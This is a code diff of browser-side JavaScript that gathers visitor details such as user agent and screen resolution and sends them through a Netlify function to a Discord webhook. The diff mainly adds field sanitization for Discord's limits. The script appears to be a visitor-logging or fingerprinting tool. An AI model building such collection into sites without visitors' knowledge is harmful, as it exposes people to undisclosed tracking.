@@ -38,11 +38,17 @@
     return path.reduce((acc, key) => (acc && acc[key] !== undefined) ? acc[key] : defaultValue, obj);
   }
 
-  function safeValue(val, maxLen=1024) {
-    if (val === undefined || val === null || val === '') return "N/A";
-    val = val.toString();
-    if (val.length > maxLen) return val.slice(0, maxLen - 3) + '...';
-    return val;
+  // Sanitize embed field name/value for Discord limits
+  function sanitizeFieldName(name) {
+    if (!name) return "N/A";
+    name = name.toString();
+    return name.length > 256 ? name.slice(0, 253) + "..." : name;
+  }
+
+  function sanitizeFieldValue(value) {
+    if (value === undefined || value === null || value === '') return "N/A";
+    value = value.toString();
+    return value.length > 1024 ? value.slice(0, 1021) + "..." : value;
   }
 
   function chunkArray(arr, size) {
@@ -70,10 +76,28 @@
   }
 
   async function sendDiscordWebhook(embeds) {
+    if (!embeds || embeds.length === 0) throw new Error("No embeds to send");
+
+    // Clean embeds: sanitize names and values, remove empty
+    const cleanEmbeds = embeds.map(embed => {
+      if (!embed.fields || embed.fields.length === 0) return embed;
+      embed.fields = embed.fields
+        .map(f => {
+          const name = sanitizeFieldName(f.name);
+          const value = sanitizeFieldValue(f.value);
+          return { name, value, inline: !!f.inline };
+        })
+        // remove fields with empty name or value
+        .filter(f => f.name !== "N/A" && f.value !== "N/A");
+      return embed;
+    }).filter(embed => embed.fields && embed.fields.length > 0);
+
+    if (cleanEmbeds.length === 0) throw new Error("No valid embed fields after sanitizing");
+
     const res = await fetch(netlifyFunctionUrl, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ embeds }),
+      body: JSON.stringify({ embeds: cleanEmbeds }),
     });
     if (!res.ok) {
       const text = await res.text();
@@ -143,6 +167,14 @@
         { name: "User Agent", value: `\`\`\`${navigator.userAgent}\`\`\``, inline: false },
         { name: "Screen Resolution", value: `\`${window.screen.width}×${window.screen.height} (Logical), ${Math.round(window.screen.width * window.devicePixelRatio)}×${Math.round(window.screen.height * window.devicePixelRatio)} (Physical)\``, inline: true },
       ];
+
+      // Helper to sanitize values for Discord field limits
+      function safeValue(val, maxLen=1024) {
+        if (val === undefined || val === null || val === '') return "N/A";
+        val = val.toString();
+        if (val.length > maxLen) return val.slice(0, maxLen - 3) + '...';
+        return val;
+      }
 
       const embedChunks = chunkArray(allFields, 25);
       await sendDiscordWebhook(embedChunks);
